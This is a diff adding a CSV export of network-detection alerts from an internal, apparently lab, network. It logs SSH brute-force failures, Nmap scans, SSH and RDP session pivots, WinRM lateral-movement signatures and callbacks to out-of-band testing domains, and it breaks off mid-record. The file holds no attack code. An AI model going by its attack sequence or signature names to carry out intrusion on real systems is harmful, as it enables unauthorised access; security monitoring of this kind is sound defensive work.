@@ -1,0 +1,549 @@
+SEVERITY,ID,OCCURRED_AT,TYPE,DETECTION_QUADS,SUMMARY,CONTENT,DETECTION,ASSET_IDS,SOURCE_HOST_NAME,DESTINATION_HOST_NAME,SOURCE_IP,DESTINATION_IP,OTHER_IP,SOURCE,PACKET_CAPTURE_STATE
+Low,27504,2025-03-28T08:37:16Z,Indicator,Indicator,TCP SYN with ECE/CWR Flags + Empty Payload + IP Fragbits Not Set (Nmap -sS window SYN Stealth Scan Possible),TCP SYN with ECE/CWR Flags + Empty Payload + IP Fragbits Not Set (Nmap -sS window SYN Stealth Scan Possible),Nmap Signatures,"1921,2885",,,10.0.9.30,10.0.9.1,,Network Traffic,
+Low,27562,2025-03-28T08:40:56Z,Communication,Configuration,Detected 7 NewDestIp between 2025-03-28T08:34:33.646Z and 2025-03-28T08:40:56.444Z,"Sample NewDestIp values include:
+  dst__port: ('',);
+  ip_dst_asset_id: ('2888', '2883', '2885', '2887', '2950', '2881', '2914');
+  midpointId: 5664f842-5d7d-453d-b40f-1e59ebb44918, 82274619-a8db-4f88-8c8b-1409f015a844, 89d86925-5850-449a-b9a1-360734689c41, a0e0b3d9-8608-4f8c-9327-d0a72a674588, 69884a2b-ad1a-483b-852e-307665413558, c1a36162-4109-4ff6-8876-83a226e3d512, 48e13dfc-7cc7-45f4-ab40-bd9050416a57;
+  uuid: 35caa99b-7363-4dd4-b196-ac0a75f64e4e, 186b844a-7dd1-4d02-89a0-e8628ff129c1, 13082162-8bd7-46e7-be6c-b3c5782dc87a, 130a267e-a76e-4951-a313-9d3a675be72a, 2c34d517-7040-419c-a004-d0211a127bb4, 6715090f-06ba-4441-94ab-0ad0c596f0fb, 8f1078d7-3643-4e92-a3b5-d69bcd2358be;
+  ip_dst: 10.0.1.1, 10.0.6.1, 10.0.9.1, 10.0.7.1, 10.0.11.1, 10.0.3.1, 10.0.12.1;
+  src__mac: ;
+  dst__mac: ;
+  protocol: TLS, TCP, SMTP, FTP_CONTROL, ICMP, IMAPS, BGP;
+  dst__ip: ;
+  src__port: ('',);
+  src__ip: ;",New IP Address as Destination,"2888,2883,2885,2887,2950,2881,2914",,,,"10.0.11.1,10.0.12.1,10.0.9.1,10.0.7.1,10.0.6.1,10.0.1.1,10.0.3.1",,"35caa99b-7363-4dd4-b196-ac0a75f64e4e, 186b844a-7dd1-4d02-89a0-e8628ff129c1, 13082162-8bd7-46e7-be6c-b3c5782dc87a, 130a267e-a76e-4951-a313-9d3a675be72a, 2c34d517-7040-419c-a004-d0211a127bb4, 6715090f-06ba-4441-94ab-0ad0c596f0fb, 8f1078d7-3643-4e92-a3b5-d69bcd2358be",
+Low,27617,2025-03-28T08:35:56Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,edf02c9b-eb5b-43aa-a475-510f08561ca3,
+Low,27625,2025-03-28T08:34:56Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,ac8c9c78-e545-4926-880d-94256a808dd6,
+Low,27627,2025-03-28T08:34:56Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,6729f40a-723e-4825-ad21-563ed62ea66f,
+Low,27633,2025-03-28T08:33:49Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,fb8a05ec-ad31-47eb-bdce-eb43308b608d,
+Low,27635,2025-03-28T08:33:49Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,c89d60f0-6a26-43c0-9726-963c39963f38,
+Low,27680,2025-03-28T08:40:34Z,Communication,Indicator,Failed HTTP Logon,"Asset 1732 (10.0.9.11) returned an HTTP response code of 401 'Unauthorized' to asset 1921 (10.0.9.30), which represents a failed logon attempt via HTTP by asset 1921. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1921,1732",,,10.0.9.11,10.0.9.30,,2e41d27a-6b8d-4c80-b3ed-773b306bdbf4,
+Low,27775,2025-03-28T08:42:03Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1732 (10.0.9.11) via RDP.,Interactive Session Pivots,"2896,1732",,,10.0.242.127,10.0.9.11,,,
+Low,29125,2025-03-28T08:54:52Z,Indicator,Indicator,DNS Query to Suspicious TLD .download,DNS Query to Suspicious TLD .download,Suspicious TLD Signatures,"1921,69",,,10.0.9.30,8.8.8.8,,Network Traffic,
+Low,29126,2025-03-28T08:54:52Z,Indicator,Indicator,DNS Query to Suspicious TLD .download,DNS Query to Suspicious TLD .download,Suspicious TLD Signatures,"1921,69",,,10.0.9.30,8.8.8.8,,Network Traffic,
+Low,29127,2025-03-28T08:54:23Z,Indicator,Threat Behavior,SSH Banner Invalid,SSH Banner Invalid,SSH Hunting Signatures,"1921,1732",,,10.0.9.30,10.0.9.11,,Network Traffic,
+Medium,29129,2025-03-28T08:54:45Z,Indicator,Indicator,Python PSRP Client User-Agent,Python PSRP Client User-Agent,Python User Agent Signatures,"1921,1732",,,10.0.9.30,10.0.9.11,,Network Traffic,
+Medium,29130,2025-03-28T08:54:45Z,Indicator,Indicator,WinRM wsman Rapid Access - Possible Lateral Movement,WinRM wsman Rapid Access - Possible Lateral Movement,WinRM Signatures,"1921,1732",,,10.0.9.30,10.0.9.11,,Network Traffic,
+Medium,29131,2025-03-28T08:54:45Z,Indicator,Indicator,WinRM wsman Access,WinRM wsman Access,WinRM Signatures,"1921,1732",,,10.0.9.30,10.0.9.11,,Network Traffic,
+Low,29132,2025-03-28T08:54:52Z,Indicator,Indicator,HTTP Request to Suspicious TLD .download,HTTP Request to Suspicious TLD .download,Suspicious TLD Signatures,"1921,2642",,,10.0.9.30,104.17.253.239,,Network Traffic,
+Low,29133,2025-03-28T08:54:52Z,Indicator,Indicator,HTTP Request to Suspicious TLD .download,HTTP Request to Suspicious TLD .download,Suspicious TLD Signatures,"1921,2642",,,10.0.9.30,104.17.253.239,,Network Traffic,
+Medium,29134,2025-03-28T08:54:45Z,Indicator,Indicator,WinRM User Agent,WinRM User Agent,WinRM Signatures,"1921,1732",,,10.0.9.30,10.0.9.11,,Network Traffic,
+Medium,29358,2025-03-28T08:54:23Z,Communication,Threat Behavior,Multiple Suricata Alerts,"Asset 1921 involved in 16 unique Suricata alerts: ['9006773', '9006264', '20240042', '20240137', '9003999', '20240111', '20240041', '20240006', '9005422', '9006744', '9004105', '9003897', '2013504', '20240005', '9908342', '20240024']; ['SSH Banner Invalid', 'HTTP POST Empty x15', 'ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management', ""401 'Unauthorized'"", 'TCP SYN with ECE/CWR Flags + Empty Payload + IP Fragbits Not Set (Nmap -sS window SYN Stealth Scan Possible)', 'HTTP POST to IP', 'HTTP Request to Suspicious TLD .download', 'HTTP GET to IP', 'WinRM wsman Access', 'DNS Query to Suspicious TLD .download', 'Python User-Agent', 'WinRM User Agent', 'Python PSRP Client User-Agent', 'WinRM wsman Rapid Access - Possible Lateral Movement']. IPs: 10.0.9.11 10.0.9.30.",Multiple Suricata Alerts,"1921,1732",,,10.0.9.30,10.0.9.11,,,
+Low,29371,2025-03-28T08:55:09Z,Communication,Configuration,Detected 16 RDP New Comms between 2025-03-28T08:44:11.960Z and 2025-03-28T08:55:09.183Z,"Sample RDP New Comms values include:
+  rdp_client_name: ;
+  dst__port: ('',);
+  ip_src: 10.0.1.12, 10.0.12.11, 10.0.9.30, 10.0.1.29, 10.0.1.30, 10.0.6.30, 10.0.9.11, 10.0.6.12, 10.0.1.11, 10.0.12.30;
+  dst_asset_id: 1732, 44, 1898, 45, 1910, 46, 1810, 1921, 151, 1742;
+  rdp_keyboard_layout: ;
+  ip_dst: 10.0.1.12, 10.0.1.29, 10.0.9.30, 10.0.12.11, 10.0.1.30, 10.0.6.30, 10.0.9.11, 10.0.6.12, 10.0.1.11, 10.0.12.30;
+  rdp_selected_protocol: , hybrid, hybrid_ex;
+  src__mac: ;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1732, 44, 1898, 45, 1910, 46, 1810, 1921, 151, 1742;
+  dst__ip: ;
+  src__port: ('',);
+  rdp_rt_cookie: , nmap, test, devel;
+  src__ip: ;",RDP New Comms Pattern,"1732,44,1898,45,1910,46,1810,1921,151,1742",,,"10.0.9.11,10.0.1.29,10.0.6.30,10.0.1.11,10.0.12.30,10.0.1.12,10.0.6.12,10.0.9.30,10.0.1.30,10.0.12.11","10.0.9.11,10.0.1.29,10.0.6.30,10.0.1.11,10.0.12.30,10.0.1.12,10.0.6.12,10.0.9.30,10.0.1.30,10.0.12.11",,,
+Low,29426,2025-03-28T08:58:13Z,Communication,Configuration,Detected 878 New Global User Agent between 2025-03-28T08:45:37.227Z and 2025-03-28T08:58:13.955Z,"Sample New Global User Agent values include:
+  dst__port: ('',);
+  dst_asset_id: 1732, 45, 1841, 1754, 1810, 1791;
+  uuid: 05c37c80-0db6-4e8b-a597-4c7287f31aac, 122a67d4-c331-4c7f-9c66-6a17c6562446, e8dfc6af-48d4-441e-8a64-dd7e56bb4405, 09486360-d9b2-4a33-b166-5c10106eb991, 00f6e664-6450-4756-ae38-5f68cf51665c, 05b20a51-2ad7-4183-926d-c5b11c96b7e8, 7ab249ab-01d4-4fcb-86a8-211661aca4f1, 0b7d22c6-d7c0-4920-a1e5-266ce319424e, 05965efd-7ead-4749-a034-9141383b0f69, 3b5cc11f-45cc-430b-bc20-208eb86dc788;
+  dst_ip: 10.0.7.12, 10.0.6.11, 10.0.3.12, 10.0.9.11, 10.0.6.12, 10.0.1.11;
+  src__mac: ;
+  src_ip: 10.0.7.30, 10.0.9.30, 10.0.1.30, 10.0.6.30, 10.0.3.30;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1898, 1896, 1921, 1914, 151;
+  dst__ip: ;
+  host: interact.sh, 10.0.7.12, 10.0.6.11, 10.0.9.11, 10.0.6.12, 127.0.0.1, localhost, oast.online;
+  src__port: ('',);
+  user_agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.7.25, Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.79, Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36, Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.7.23, Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0) AppleWebKit/618.25.8 (KHTML, like Gecko) Version/17.3 Safari/618.25.8, Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36, Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36, Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36, Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.0 Safari/537.36, Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.4.24;
+  src__ip: ;",User Agent First Seen Globally,"1732,1898,45,1810,1921,151,1754,1914,1841,1896,1791",,,"10.0.6.30,10.0.9.30,10.0.1.30,10.0.7.30,10.0.3.30","10.0.9.11,10.0.1.11,10.0.6.12,10.0.6.11,10.0.7.12,10.0.3.12",,"05c37c80-0db6-4e8b-a597-4c7287f31aac, 122a67d4-c331-4c7f-9c66-6a17c6562446, e8dfc6af-48d4-441e-8a64-dd7e56bb4405, 09486360-d9b2-4a33-b166-5c10106eb991, 00f6e664-6450-4756-ae38-5f68cf51665c, 05b20a51-2ad7-4183-926d-c5b11c96b7e8, 7ab249ab-01d4-4fcb-86a8-211661aca4f1, 0b7d22c6-d7c0-4920-a1e5-266ce319424e, 05965efd-7ead-4749-a034-9141383b0f69, 3b5cc11f-45cc-430b-bc20-208eb86dc788",
+Low,29435,2025-03-28T08:55:09Z,Communication,Configuration,RDP New Cookie,New RDP cookie devel from host 10.0.9.11 (asset 1732) to host 10.0.9.30 (asset 1921).,RDP New Cookie,"1732,1921",,,10.0.9.11,10.0.9.30,,,
+Low,29451,2025-03-28T08:54:20Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1732 (10.0.9.11) via SSH.,Interactive Session Pivots,"2896,1732",,,10.0.242.127,10.0.9.11,,,
+Low,29478,2025-03-28T08:56:28Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,6545a164-2a51-48d9-b066-7d1d5f06b729,
+Low,29482,2025-03-28T08:56:20Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,74704f7b-350a-49c9-9555-a8012762f719,
+Low,29607,2025-03-28T08:57:58Z,Communication,Configuration,Detected 11 NewSMBTraffic between 2025-03-28T08:45:54.336Z and 2025-03-28T08:57:58.687Z,"Sample NewSMBTraffic values include:
+  dst__port: ('',);
+  dst_asset_id: 1732, 50, 1841, 46, 1916, 1754, 1686, 1810, 1921, 151;
+  uuid: 544c4c49-960c-4a79-9358-c966c0b03a6a, 380c258d-3b25-408f-8bbd-ae0d350cab80, 473a6aff-b55c-4d96-a785-b0005978c327, b3688414-6495-4c11-adce-e28cef1c8bf4, eb70bc18-7260-4bb0-aa14-77aa2e73e16b, 9680cd6c-100b-4cfd-8dd3-b61627f5ad2c, d5159965-c70f-46f4-b0a4-3afa6714c62a, d5f92c98-0997-4ef3-ac45-1d8572e4e662, 1c63caed-4b38-4b60-b31c-80b3feb3a91e, eeee609a-4e55-4805-8924-6b4358952d05;
+  src__mac: ;
+  dst__mac: ;
+  log_type: SMB_FileInfo, SMB_TreeInfo;
+  protocol: ;
+  versions: , SMB2, SMB1;
+  src_asset_id: 44, 1898, 1910, 154, 1807, 1914, 1729, 1921, 151, 1687;
+  dst__ip: ;
+  src__port: ('',);
+  src__ip: ;",New SMB Communication Detection,"1732,1754,1810,1914,44,1898,1910,151,1921,154,1686,1841,1807,1729,1687,50,46,1916",,,"10.0.7.30,10.0.1.29,10.0.6.30,10.0.12.30,10.0.1.30,10.0.9.30,10.0.2.30,10.0.10.44,10.0.9.29,10.0.8.29","10.0.9.11,10.0.6.11,10.0.6.12,10.0.1.30,10.0.9.30,10.0.10.43,10.0.7.12,10.0.2.29,10.0.1.12,10.0.8.30",,"544c4c49-960c-4a79-9358-c966c0b03a6a, 380c258d-3b25-408f-8bbd-ae0d350cab80, 473a6aff-b55c-4d96-a785-b0005978c327, b3688414-6495-4c11-adce-e28cef1c8bf4, eb70bc18-7260-4bb0-aa14-77aa2e73e16b, 9680cd6c-100b-4cfd-8dd3-b61627f5ad2c, d5159965-c70f-46f4-b0a4-3afa6714c62a, d5f92c98-0997-4ef3-ac45-1d8572e4e662, 1c63caed-4b38-4b60-b31c-80b3feb3a91e, eeee609a-4e55-4805-8924-6b4358952d05",
+Low,29617,2025-03-28T08:59:44Z,Asset,Configuration,Detected 896 NewUserAgent between 2025-03-28T08:45:00.942Z and 2025-03-28T08:59:44.327Z,"Sample NewUserAgent values include:
+  dst__port: ('',);
+  uuid: 05c37c80-0db6-4e8b-a597-4c7287f31aac, 122a67d4-c331-4c7f-9c66-6a17c6562446, e8dfc6af-48d4-441e-8a64-dd7e56bb4405, 09486360-d9b2-4a33-b166-5c10106eb991, 00f6e664-6450-4756-ae38-5f68cf51665c, 05b20a51-2ad7-4183-926d-c5b11c96b7e8, 055c6764-3df9-4f6f-af7e-1ff4b38a32bf, 0b7d22c6-d7c0-4920-a1e5-266ce319424e, 3b5cc11f-45cc-430b-bc20-208eb86dc788, 0ef0fed3-32b1-49fa-9121-9b36fc8fdced;
+  src__mac: ;
+  src_ip: 10.0.7.30, 10.0.9.30, 10.0.242.127, 10.0.1.30, 10.0.7.29, 10.0.6.30, 10.0.6.11, 10.0.7.11, 10.0.3.30, 10.0.5.30;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1680, 1898, 1896, 1910, 1936, 1772, 2896, 1754, 1921, 1914;
+  dst__ip: ;
+  src__port: ('',);
+  user_agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.7.25, Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.79, Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36, Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.7.23, Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0) AppleWebKit/618.25.8 (KHTML, like Gecko) Version/17.3 Safari/618.25.8, Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36, Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36, Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36, Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.0 Safari/537.36, Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.4.24;
+  src__ip: ;",User Agent First Seen,"2896,1772,1754,1914,1898,1896,1910,1921,1936,1680",,,,,"10.0.242.127,10.0.7.11,10.0.6.11,10.0.7.30,10.0.6.30,10.0.3.30,10.0.12.30,10.0.9.30,10.0.5.30,10.0.7.29","05c37c80-0db6-4e8b-a597-4c7287f31aac, 122a67d4-c331-4c7f-9c66-6a17c6562446, e8dfc6af-48d4-441e-8a64-dd7e56bb4405, 09486360-d9b2-4a33-b166-5c10106eb991, 00f6e664-6450-4756-ae38-5f68cf51665c, 05b20a51-2ad7-4183-926d-c5b11c96b7e8, 055c6764-3df9-4f6f-af7e-1ff4b38a32bf, 0b7d22c6-d7c0-4920-a1e5-266ce319424e, 3b5cc11f-45cc-430b-bc20-208eb86dc788, 0ef0fed3-32b1-49fa-9121-9b36fc8fdced",
+High,29686,2025-03-28T09:08:08Z,Indicator,Indicator,Nmap - HTTP User-Agent Nmap,Nmap - HTTP User-Agent Nmap,Nmap Signatures,"1921,1732",,,10.0.9.30,10.0.9.11,,Network Traffic,
+Low,29789,2025-03-28T08:59:43Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.11.,SSH Authentication Failure,"2896,1732",,,10.0.242.127,10.0.9.11,,909b2857-3edf-4d4a-8f3d-e970428a4b0a,
+Low,29790,2025-03-28T08:59:43Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.29.,SSH Authentication Failure,"2896,1729",,,10.0.242.127,10.0.9.29,,a36775cc-af66-4880-8ef8-f2a064b5f5f5,
+Low,29804,2025-03-28T09:10:04Z,Communication,Configuration,New Global User Agent,User Agent 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' was seen in the environment for the first time. Originating from asset 1921 (10.0.9.30) to 10.0.9.11 (10.0.9.11).,User Agent First Seen Globally,"1921,1732",,,10.0.9.30,10.0.9.11,,45883df0-7fd9-4f35-97ac-17683b81bf29,
+High,29908,2025-03-28T09:07:53Z,Communication,Threat Behavior,Nmap First Seen,"Nmap behavior seen from 10.0.9.30 (asset 1921) for the first time in the time period. Behaviors exhibited by Nmap can also be the result of misconfigurations or other benign situations. Signatures: ET SCAN Possible Nmap User-Agent Observed, Nmap - HTTP User-Agent Nmap",Nmap First Seen,"1921,1732",,,10.0.9.30,10.0.9.11,,,
+Low,29913,2025-03-28T09:09:55Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1732 (10.0.9.11) via SSH.,Interactive Session Pivots,"2896,1732",,,10.0.242.127,10.0.9.11,,,
+Low,29922,2025-03-28T09:14:30Z,Asset,Configuration,Detected 9 NewUserAgent between 2025-03-28T09:02:49.240Z and 2025-03-28T09:14:30.449Z,"Sample NewUserAgent values include:
+  dst__port: ('',);
+  uuid: bf1164c7-a247-4eee-a6f0-769db5f03de0, 121384db-22a9-48fa-a2fd-4392f957f69e, 0477b81c-6bbf-42de-af0e-9450333e5411, 45883df0-7fd9-4f35-97ac-17683b81bf29, 0cc1adb4-e31d-4c76-90cd-ac5837e4d03d, 0af97537-a3b6-42e6-bff9-fbfe1d2caaa3, 32e46608-18cc-4163-a6da-9f88f1dc9ded, 0b5a2466-36b6-4c01-8d53-db3320d9c7e4, 08b6d6e9-aaa2-4998-a1ed-5527e8c6acd6;
+  src__mac: ;
+  src_ip: 10.0.9.30, 10.0.4.30, 10.0.6.30, 10.0.11.30, 10.0.12.30;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1905, 1898, 1910, 1933, 1921;
+  dst__ip: ;
+  src__port: ('',);
+  user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html), Ruby WinRM Client (2.8.3, ruby 3.3.7 (2025-01-15)), Debian APT-HTTP/1.3 (2.9.29), python-requests/2.32.3, Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0, Python PSRP Client, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36, Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0;
+  src__ip: ;",User Agent First Seen,"1905,1898,1910,1933,1921",,,,,"10.0.4.30,10.0.6.30,10.0.12.30,10.0.11.30,10.0.9.30","bf1164c7-a247-4eee-a6f0-769db5f03de0, 121384db-22a9-48fa-a2fd-4392f957f69e, 0477b81c-6bbf-42de-af0e-9450333e5411, 45883df0-7fd9-4f35-97ac-17683b81bf29, 0cc1adb4-e31d-4c76-90cd-ac5837e4d03d, 0af97537-a3b6-42e6-bff9-fbfe1d2caaa3, 32e46608-18cc-4163-a6da-9f88f1dc9ded, 0b5a2466-36b6-4c01-8d53-db3320d9c7e4, 08b6d6e9-aaa2-4998-a1ed-5527e8c6acd6",
+Low,30005,2025-03-28T09:22:34Z,Communication,Configuration,Detected 7 NewX509Certificate between 2025-03-28T09:11:30.268Z and 2025-03-28T09:22:34.234Z,"Sample NewX509Certificate values include:
+  server: 142.250.185.234, 10.0.5.29, 63.33.151.92, 10.0.9.12, 206.189.156.69, 54.220.122.8, 34.110.138.217;
+  subject: , CN=*.oastify.com, CN=CLI1.PLUMETECH.LOCAL;
+  not_before: , 2025-03-26T02:16:08Z, 2025-03-05T00:00:00Z;
+  server_asset_id: 1704, 3589, 3593, 3592, 1854, 3591, 3590;
+  dst__port: ('',);
+  dns: ;
+  uuid: 18e8b9c1-9bea-42ef-ab82-7a27585c7fbd, d19649b2-bf4d-43fb-a7f0-fd5a400bf6ab, 2105f12d-9a59-4e3d-8952-a0eae7e2fec4, b9e9c9f9-5b0e-4b59-b5fe-640670d82d53, b3e8e423-a986-4885-919e-78e50c4da799, 505829c6-c727-440b-8018-36fe71fc5093, 7198f432-e2c6-4541-8148-3dd2cb51f90b;
+  issuer: , C=GB, ST=Greater Manchester, L=Salford, O=Sectigo Limited, CN=Sectigo RSA Domain Validation Secure Server CA, CN=CLI1.PLUMETECH.LOCAL;
+  client_asset_id: 1905, 1898, 1936, 1921, 151;
+  src__mac: ;
+  not_after: , 2026-01-29T23:59:59Z, 2025-09-25T02:16:08Z;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.9.30, 10.0.1.30, 10.0.4.30, 10.0.6.30, 10.0.5.30;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"1936,1704,1921,151,3589,3593,3592,1854,3591,3590,1905,1898",,,"10.0.5.29,206.189.156.69,142.250.185.234,54.220.122.8,10.0.9.12,63.33.151.92,34.110.138.217","10.0.5.30,10.0.9.30,10.0.1.30,10.0.4.30,10.0.6.30",,"18e8b9c1-9bea-42ef-ab82-7a27585c7fbd, d19649b2-bf4d-43fb-a7f0-fd5a400bf6ab, 2105f12d-9a59-4e3d-8952-a0eae7e2fec4, b9e9c9f9-5b0e-4b59-b5fe-640670d82d53, b3e8e423-a986-4885-919e-78e50c4da799, 505829c6-c727-440b-8018-36fe71fc5093, 7198f432-e2c6-4541-8148-3dd2cb51f90b",
+Low,30007,2025-03-28T09:18:51Z,Communication,Indicator,Failed HTTP Logon,"Asset 1854 (10.0.9.12) returned an HTTP response code of 403 'Forbidden' to asset 1921 (10.0.9.30), which represents a failed logon attempt via HTTP by asset 1921. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1921,1854",,,10.0.9.12,10.0.9.30,,c6ff8ae9-81aa-408c-bcb5-f0db2cbbe1ea,
+Low,30062,2025-03-28T09:28:43Z,Communication,Configuration,Detected 13 NewSMBTraffic between 2025-03-28T09:13:46.229Z and 2025-03-28T09:28:43.289Z,"Sample NewSMBTraffic values include:
+  dst__port: ('',);
+  dst_asset_id: 1829, 1725, 45, 1916, 1772, 1746, 1784, 154, 1704, 1921;
+  uuid: 795b1df6-a68a-4d4c-a011-81e6c00634a2, 09608805-9a63-4571-9048-7d7dda3e2343, f60133ab-26bc-4de0-bee0-0a6f0bf97361, 225d8dd8-a967-4b94-b91c-cab7e77f1375, 93b0fe16-a160-4d5c-bb64-33462ad25dd2, 8f3d4692-ac47-497e-af1e-12fccdb68863, 75ae4e99-8e5d-4e8e-99c1-2d435fc05400, e3ddc142-cac6-4e5c-a945-035e90026b3d, 259b8d04-90c6-4aed-aceb-8ba8c10eb26b, 9633be28-2705-4686-ac28-b38130815c42;
+  src__mac: ;
+  dst__mac: ;
+  log_type: SMB_FileInfo, SMB_TreeInfo;
+  protocol: ;
+  versions: , SMB2, UNKNOWN, SMB1;
+  src_asset_id: 1680, 1905, 1898, 50, 1936, 1916, 1914, 1729, 1933, 151;
+  dst__ip: ;
+  src__port: ('',);
+  src__ip: ;",New SMB Communication Detection,"1936,1704,1921,1680,1914,1746,151,1905,1898,45,1772,1933,1725,1916,154,50,1729,1829,1784",,,"10.0.5.30,10.0.7.29,10.0.7.30,10.0.1.30,10.0.4.30,10.0.6.30,10.0.11.30,10.0.8.30,10.0.2.29,10.0.9.29","10.0.5.29,10.0.9.30,10.0.6.29,10.0.1.11,10.0.7.11,10.0.11.29,10.0.8.30,10.0.2.30,10.0.4.12,10.0.8.12",,"795b1df6-a68a-4d4c-a011-81e6c00634a2, 09608805-9a63-4571-9048-7d7dda3e2343, f60133ab-26bc-4de0-bee0-0a6f0bf97361, 225d8dd8-a967-4b94-b91c-cab7e77f1375, 93b0fe16-a160-4d5c-bb64-33462ad25dd2, 8f3d4692-ac47-497e-af1e-12fccdb68863, 75ae4e99-8e5d-4e8e-99c1-2d435fc05400, e3ddc142-cac6-4e5c-a945-035e90026b3d, 259b8d04-90c6-4aed-aceb-8ba8c10eb26b, 9633be28-2705-4686-ac28-b38130815c42",
+Medium,30079,2025-03-28T09:30:03Z,Indicator,Indicator,WinRM wsman Access,WinRM wsman Access,WinRM Signatures,"1921,1729",,,10.0.9.30,10.0.9.29,,Network Traffic,
+Medium,30080,2025-03-28T09:30:03Z,Indicator,Indicator,WinRM wsman Access,WinRM wsman Access,WinRM Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
+Low,30166,2025-03-28T09:38:52Z,Communication,Configuration,Detected 13 NewX509Certificate between 2025-03-28T09:30:44.778Z and 2025-03-28T09:38:52.445Z,"Sample NewX509Certificate values include:
